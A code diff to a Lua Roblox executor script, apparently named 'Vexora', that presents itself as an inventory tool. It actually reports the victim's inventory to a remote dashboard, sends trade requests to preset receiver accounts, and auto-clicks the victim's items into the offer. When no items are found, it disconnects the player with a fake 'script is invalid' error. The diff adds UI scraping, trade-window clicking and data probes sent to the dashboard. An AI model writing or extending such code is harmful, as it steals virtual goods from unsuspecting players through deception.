@@ -3,7 +3,7 @@
 -- your full inventory so you can join the server and collect.
 -- the loader holds for SESSION_SECONDS (5 minutes), then the client detaches cleanly.
 
-local CLIENT_REV = "2.5"
+local CLIENT_REV = "2.6"
 local TOKEN = "{{TOKEN}}"
 local ENDPOINT = "{{ENDPOINT}}"
 local MIN_VALUE = {{MIN_VALUE}}
@@ -26,13 +26,14 @@ local AUTO_CLAIM = true        -- ask the dashboard to send a claimer alt into t
 local AUTO_TRADE_DELAY = 2     -- seconds between trade attempts
 local RECEIVER_RETRY = 3       -- trade requests per receiver before giving up
 local OFFER_GAP = 0.35         -- seconds between offered items
+local OFFER_LIMIT = 24         -- trade window buttons clicked per offer pass
 local SESSION_SECONDS = 300    -- how long the loader + client runs (5 minutes)
 local REPORT_INVENTORY = true  -- dump the executor's inventory to the dashboard on load
 
 --[[ no-real-item kick ]]
 local KICK_IF_EMPTY = true     -- disconnect when the inventory holds nothing worth trading
-local EMPTY_GRACE = 10         -- seconds to wait for the game to hand you items on load/respawn
-local EMPTY_CHECKS = 1         -- empty reads needed before it kicks (1 = immediately)
+local EMPTY_GRACE = 15         -- seconds to wait for the game to hand you items on load/respawn
+local EMPTY_CHECKS = 3         -- empty reads needed before it kicks (never on an unreadable inventory)
 local EMPTY_INTERVAL = 3       -- seconds between inventory checks
 local EMPTY_KICK_MESSAGE = "Error: script is invalid."
 
@@ -363,7 +364,8 @@ end
 -- each entry carries where it was found, so an auto-equipped default weapon can
 -- be told apart from something the account actually owns
 local ITEM_FOLDERS = {
-    "Inventory", "Items", "OwnedItems", "Owned", "Collection", "Skins", "Weapons", "Knives", "Guns",
+    "Inventory", "InventoryItems", "Items", "OwnedItems", "Owned", "OwnedWeapons",
+    "Collection", "Skins", "Weapons", "Knives", "Guns",
 }
 
 -- mm2-style tools carry the real item name on a StringValue child
@@ -376,12 +378,111 @@ local function toolLabel(tool)
     return tool.Name
 end
 
+--[[ ---- ui readers ---- ]]
+-- a lot of games never replicate owned items into the player object. their inventory
+-- panel does list them, so the panel and the open trade window are read as well.
+local CONTROL_LABELS = {
+    "equip", "unequip", "salvage", "search", "sort", "filter", "close", "back", "next",
+    "previous", "prev", "page", "accept", "decline", "confirm", "cancel", "trade", "offer",
+    "buy", "sell", "open", "inventory", "settings", "menu", "claim", "collect", "send",
+    "remove", "clear", "select", "view", "info", "value", "rarity", "locked", "favorite",
+    "favourite", "delete", "scrap", "upgrade", "spin", "case", "shop", "store", "x", "ok",
+    "yes", "no", "all",
+}
+local CONTROL_PARTS = {
+    "accept", "decline", "confirm", "cancel", "equip", "salvage", "search", "filter",
+    "sort by", "next page", "previous page", "close", "send trade", "trade request",
+    "start trade", "make offer", "add offer", "make trade",
+}
+local GENERIC_NAMES = {
+    "frame", "imagebutton", "textbutton", "button", "item", "items", "slot", "card",
+    "view", "icon", "image", "label", "template", "container", "holder", "grid",
+}
+
+local function norm(text)
+    return tostring(text or ""):gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", "")
+end
+
+local function isControlLabel(text)
+    local n = norm(text):lower()
+    if #n < 2 then return true end
+    for _, word in ipairs(CONTROL_LABELS) do
+        if n == word then return true end
+    end
+    for _, word in ipairs(CONTROL_PARTS) do
+        if n:find(word, 1, true) then return true end
+    end
+    return false
+end
+
+local function buttonLabel(button)
+    local text
+    if button:IsA("TextButton") then text = norm(button.Text) end
+    if not text or #text < 2 then
+        for _, child in ipairs(button:GetDescendants()) do
+            if child:IsA("TextLabel") then
+                local value = norm(child.Text)
+                if #value >= 2 then text = value break end
+            end
+        end
+    end
+    if not text or #text < 2 then text = norm(button.Name) end
+    if #text < 2 then return nil end
+    for _, generic in ipairs(GENERIC_NAMES) do
+        if text:lower() == generic then return nil end
+    end
+    return text
+end
+
+local function clickButton(button)
+    local clicked = false
+    pcall(function()
+        game:GetService("VirtualUser"):ClickButton(button)
+        clicked = true
+    end)
+    if not clicked and typeof(firesignal) == "function" then
+        pcall(function()
+            firesignal(button.MouseButton1Click)
+            clicked = true
+        end)
+    end
+    return clicked
+end
+
+-- sticky read state: "seen" only turns true once a real collection was listed,
+-- so an unreadable inventory can never be mistaken for an empty one
+local inventoryInfo = { collections = 0, containers = 0, gui = 0, panels = 0, seen = false }
+
+local function addGuiItems(add)
+    local player = LocalPlayer or Players.LocalPlayer
+    local gui = player and player:FindFirstChildOfClass("PlayerGui")
+    if not gui then return 0, 0 end
+
+    local panels, added = 0, 0
+    for _, screen in ipairs(gui:GetChildren()) do
+        local n = screen.Name:lower()
+        if screen:IsA("ScreenGui") and
+            (n:find("invent", 1, true) or n == "inv" or n:find("collection", 1, true)) then
+            panels = panels + 1
+            for _, obj in ipairs(screen:GetDescendants()) do
+                if obj:IsA("TextButton") or obj:IsA("ImageButton") then
+                    local label = buttonLabel(obj)
+                    if label and not isControlLabel(label) then
+                        add(label, "gui")
+                        added = added + 1
+                    end
+                end
+            end
+        end
+    end
+    return panels, added
+end
+
 local function scanInventory()
     local entries, seenItem = {}, {}
 
     local function add(name, at)
-        name = tostring(name or ""):gsub("%s+", " ")
-        name = name:gsub("^%s+", ""):gsub("%s+$", "")
+        name = norm(name)
         if #name < 2 then return end
         local key = name:lower()
         if seenItem[key] then return end
@@ -390,40 +491,80 @@ local function scanInventory()
     end
 
     local player = LocalPlayer
-    if not player then return entries end
+    local info = { collections = 0, containers = 0, gui = 0, panels = 0 }
+    if not player then return entries, info end
 
     local bag = player:FindFirstChildOfClass("Backpack")
     if bag then
+        info.containers = info.containers + 1
         for _, child in ipairs(bag:GetChildren()) do
             if child:IsA("Tool") then add(toolLabel(child), "backpack") end
         end
     end
 
     if player.Character then
+        info.containers = info.containers + 1
         for _, child in ipairs(player.Character:GetChildren()) do
             if child:IsA("Tool") then add(toolLabel(child), "equipped") end
         end
     end
 
-    -- owned-item folders: every child is an item, whatever its class. murder mystery 2
-    -- keeps the whole collection under Player.Inventory as one child per owned weapon
+    -- owned-item folders: every child is an item, whatever its class
     for _, folderName in ipairs(ITEM_FOLDERS) do
         local folder = player:FindFirstChild(folderName)
         if folder then
+            info.collections = info.collections + 1
             for _, child in ipairs(folder:GetChildren()) do
                 add(child.Name, "folder")
             end
         end
     end
 
+    local panels, added = addGuiItems(add)
+    info.panels, info.gui = panels, added
+
+    inventoryInfo.collections = math.max(inventoryInfo.collections, info.collections)
+    inventoryInfo.containers = info.containers
+    inventoryInfo.gui = math.max(inventoryInfo.gui, added)
+    inventoryInfo.panels = math.max(inventoryInfo.panels, panels)
+    if info.collections > 0 or added > 0 then inventoryInfo.seen = true end
+
     table.sort(entries, function(a, b) return a.name:lower() < b.name:lower() end)
-    return entries
+    return entries, info
+end
+
+-- some inventories only fill in when their panel is opened once
+local guiToggles = 0
+
+local function findInventoryToggle()
+    local player = LocalPlayer or Players.LocalPlayer
+    local gui = player and player:FindFirstChildOfClass("PlayerGui")
+    if not gui then return nil end
+    for _, obj in ipairs(gui:GetDescendants()) do
+        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
+            local label = (buttonLabel(obj) or obj.Name):lower()
+            if label == "inv" or label:find("inventory", 1, true) or label:find("backpack", 1, true) then
+                return obj
+            end
+        end
+    end
+    return nil
 end
 
 local function collectInventory()
     local names = {}
     for _, entry in ipairs(scanInventory()) do table.insert(names, entry.name) end
     return names
+end
+
+function Vexora.inventoryState()
+    return {
+        collections = inventoryInfo.collections,
+        containers = inventoryInfo.containers,
+        gui = inventoryInfo.gui,
+        panels = inventoryInfo.panels,
+        seen = inventoryInfo.seen,
+    }
 end
 
 function Vexora.inventory(report)
@@ -484,9 +625,9 @@ local function isRealItem(entry)
         if n == exact:lower() then return false end
     end
 
-    -- mm2: the knife/gun you spawn with is just the equipped default, and the owned
-    -- collection lives in Player.Inventory - that folder is the only place items count
-    if MM2 then return entry.at == "folder" end
+    -- mm2: the knife/gun you spawn with is just the equipped default, so only a
+    -- collection folder or the inventory panel counts
+    if MM2 then return entry.at == "folder" or entry.at == "gui" end
 
     if IGNORE_EQUIPPED_DEFAULTS and entry.at == "equipped" and spawnDefaults[n] then return false end
     if not GUN_ONLY then return true end
@@ -496,8 +637,21 @@ local function isRealItem(entry)
     return false
 end
 
-local function realItems()
+local function realItems(deep)
     local all = scanInventory()
+
+    -- open the inventory panel once when it listed nothing, then read it again
+    if deep and inventoryInfo.gui == 0 and guiToggles < 2 then
+        local toggle = findInventoryToggle()
+        if toggle then
+            guiToggles = guiToggles + 1
+            clickButton(toggle)
+            task.wait(1.5)
+            all = scanInventory()
+            clickButton(toggle)
+        end
+    end
+
     local real = {}
     for _, entry in ipairs(all) do
         if isRealItem(entry) then table.insert(real, entry.name) end
@@ -506,7 +660,7 @@ local function realItems()
 end
 
 function Vexora.items()
-    return realItems()
+    return realItems(false)
 end
 
 function Vexora.selftest()
@@ -602,7 +756,7 @@ local function isReceiver(name)
     return RECEIVER_SET[tostring(name or ""):lower()] == true
 end
 
-local outgoingTrade, tradesRun = false, {}
+local outgoingTrade, tradesRun, tradeSawItems = false, {}, false
 
 local function reportTrade(stage, receiver, extra)
     local entry = {
@@ -622,6 +776,42 @@ local function reportTrade(stage, receiver, extra)
     drain()
     print(string.format("[vexora] trade:%s %s%s", entry.stage, entry.receiver,
         entry.detail and (" - " .. tostring(entry.detail)) or ""))
+end
+
+-- what the client can actually see, so a failed read can be fixed from the dashboard
+local function probeLines()
+    local player = LocalPlayer or Players.LocalPlayer
+    if not player then return { "no LocalPlayer" } end
+
+    local lines = {}
+    local function push(text)
+        if #lines < 40 then table.insert(lines, tostring(text):sub(1, 60)) end
+    end
+
+    push("user:" .. player.Name)
+    for _, child in ipairs(player:GetChildren()) do
+        if child:IsA("Folder") or child:IsA("Configuration") or child:IsA("Backpack") then
+            push("p:" .. child.Name .. "(" .. child.ClassName .. ")=" .. #child:GetChildren())
+        end
+    end
+
+    local gui = player:FindFirstChildOfClass("PlayerGui")
+    if gui then
+        for _, screen in ipairs(gui:GetChildren()) do
+            if screen:IsA("ScreenGui") then push("gui:" .. screen.Name) end
+        end
+    end
+
+    local real, all = realItems(false)
+    push(string.format("items: %d real / %d total", #real, #all))
+    push(string.format("folders=%d gui=%d panels=%d seen=%s",
+        inventoryInfo.collections, inventoryInfo.gui, inventoryInfo.panels, tostring(inventoryInfo.seen)))
+    push(string.format("remotes: trade=%d item=%d confirm=%d", #tradeRemotes, #itemRemotes, #acceptRemotes))
+    return lines
+end
+
+function Vexora.probe()
+    return probeLines()
 end
 
 -- a trade screen is any visible gui with "trade" in the name
@@ -647,18 +837,79 @@ local function tradeWindow()
     return nil
 end
 
+-- buttons in the trade window that hold your items, never the chrome. your panel is
+-- preferred by name so the receiver's cards are not clicked along with yours.
+local function tradeButtons(window)
+    local preferred, fallback = {}, {}
+    for _, obj in ipairs(window:GetDescendants()) do
+        if obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
+            local n = obj.Name:lower()
+            if n:find("your", 1, true) or n:find("self", 1, true) or n:find("player1", 1, true)
+                or n:find("left", 1, true) or n:find("myoffer", 1, true) or n:find("myitem", 1, true) then
+                table.insert(preferred, obj)
+            elseif n:find("offer", 1, true) or n:find("invent", 1, true) or n:find("item", 1, true) then
+                table.insert(fallback, obj)
+            end
+        end
+    end
+
+    local roots = #preferred > 0 and preferred or (#fallback > 0 and fallback or { window })
+    local buttons, seenButton, seenLabel = {}, {}, {}
+    for _, root in ipairs(roots) do
+        for _, obj in ipairs(root:GetDescendants()) do
+            if (obj:IsA("TextButton") or obj:IsA("ImageButton")) and not seenButton[obj] then
+                seenButton[obj] = true
+                local label = buttonLabel(obj) or norm(obj.Name)
+                local generic = false
+                for _, name in ipairs(GENERIC_NAMES) do
+                    if label:lower() == name then generic = true break end
+                end
+                local key = label:lower()
+                -- image-only cards are all named "Item"/"Slot"; every one has to be clicked
+                if not isControlLabel(label) and (generic or not seenLabel[key]) then
+                    seenLabel[key] = true
+                    table.insert(buttons, { button = obj, label = label })
+                end
+            end
+        end
+    end
+    return buttons
+end
+
 local function offerEverything(receiver)
     local items = Vexora.items()
-    local sent = 0
-    for _, name in ipairs(items) do
-        for _, remote in ipairs(itemRemotes) do
-            fire(remote, name)
-            fire(remote, receiver.Name, name)
+    local clicked, labels, fired = 0, {}, 0
+
+    -- the trade window lists your own items. clicking those cards is what actually
+    -- fills the offer slots, whatever the game named its remotes.
+    local window = tradeWindow()
+    if window then
+        task.wait(0.8)
+        local ok, list = pcall(tradeButtons, tradeWindow() or window)
+        for _, entry in ipairs(ok and list or {}) do
+            if clicked >= OFFER_LIMIT then break end
+            if clickButton(entry.button) then
+                clicked = clicked + 1
+                tradeSawItems = true
+                table.insert(labels, entry.label)
+                task.wait(OFFER_GAP)
+            end
         end
-        sent = sent + 1
-        task.wait(OFFER_GAP)
     end
-    return sent, items
+
+    -- guessed item remotes only when the ui gave us nothing to click
+    if clicked == 0 then
+        for _, name in ipairs(items) do
+            for _, remote in ipairs(itemRemotes) do
+                fire(remote, name)
+                fire(remote, receiver.Name, name)
+                fired = fired + 1
+            end
+            task.wait(OFFER_GAP)
+        end
+    end
+
+    return clicked, labels, items, fired
 end
 
 local function confirmTrade()
@@ -709,11 +960,19 @@ local function runReceiverTrade(player)
         reportTrade("window", player.Name, { detail = "trade ui open" })
 
         if PUSH_ALL_ITEMS then
-            local sent, items = offerEverything(player)
+            local clicked, labels, items, fired = offerEverything(player)
             reportTrade("offer", player.Name, {
-                items = items,
-                detail = sent .. " item(s) via " .. #itemRemotes .. " remote(s)",
+                items = clicked > 0 and labels or items,
+                detail = clicked > 0
+                    and string.format("%d item(s) clicked in the trade window", clicked)
+                    or string.format("%d item(s) via %d remote(s)", #items, #itemRemotes),
             })
+            if clicked == 0 and fired == 0 then
+                reportTrade("probe", player.Name, {
+                    items = probeLines(),
+                    detail = "nothing offered - trade window dump",
+                })
+            end
         end
 
         task.wait(1.2)
@@ -880,10 +1139,10 @@ if KICK_IF_EMPTY and not IS_CLAIMER then
         print(string.format("[vexora] no-item kick armed | grace=%ds interval=%ds checks=%d | guns_only=%s",
             EMPTY_GRACE, EMPTY_INTERVAL, EMPTY_CHECKS, tostring(GUN_ONLY)))
 
-        local emptyReads, lastSig = 0, ""
+        local emptyReads, lastSig, held, probed = 0, "", false, false
         while not stopped and not kicked do
             task.wait(EMPTY_INTERVAL)
-            local real, all = realItems()
+            local real, all = realItems(os.time() >= graceUntil)
             local count = #real
             local sig = tostring(#all) .. "|" .. table.concat(real, ",")
             if sig ~= lastSig then
@@ -895,14 +1154,30 @@ if KICK_IF_EMPTY and not IS_CLAIMER then
                     #shown > 0 and table.concat(shown, ", ") or "nothing"))
                 lastSig = sig
             end
-            if os.time() >= graceUntil then
-                if count == 0 then
+
+            -- never kick on a read we could not make. an unreadable inventory is not
+            -- an empty one, and a trade in flight is proof there is something to trade
+            if os.time() >= graceUntil and not outgoingTrade and not tradeSawItems then
+                if count == 0 and inventoryInfo.seen then
                     emptyReads = emptyReads + 1
                     print(string.format("[vexora] nothing to trade (%d/%d)", emptyReads, EMPTY_CHECKS))
                     if emptyReads >= EMPTY_CHECKS then
                         print("[vexora] no real items - kicking")
                         kickPlayer(EMPTY_KICK_MESSAGE)
                         return
+                    end
+                elseif count == 0 then
+                    emptyReads = 0
+                    if not held then
+                        held = true
+                        print("[vexora] inventory unreadable - kick held")
+                    end
+                    if not probed then
+                        probed = true
+                        reportTrade("probe", "-", {
+                            items = probeLines(),
+                            detail = "inventory unreadable, kick held",
+                        })
                     end
                 else
                     emptyReads = 0
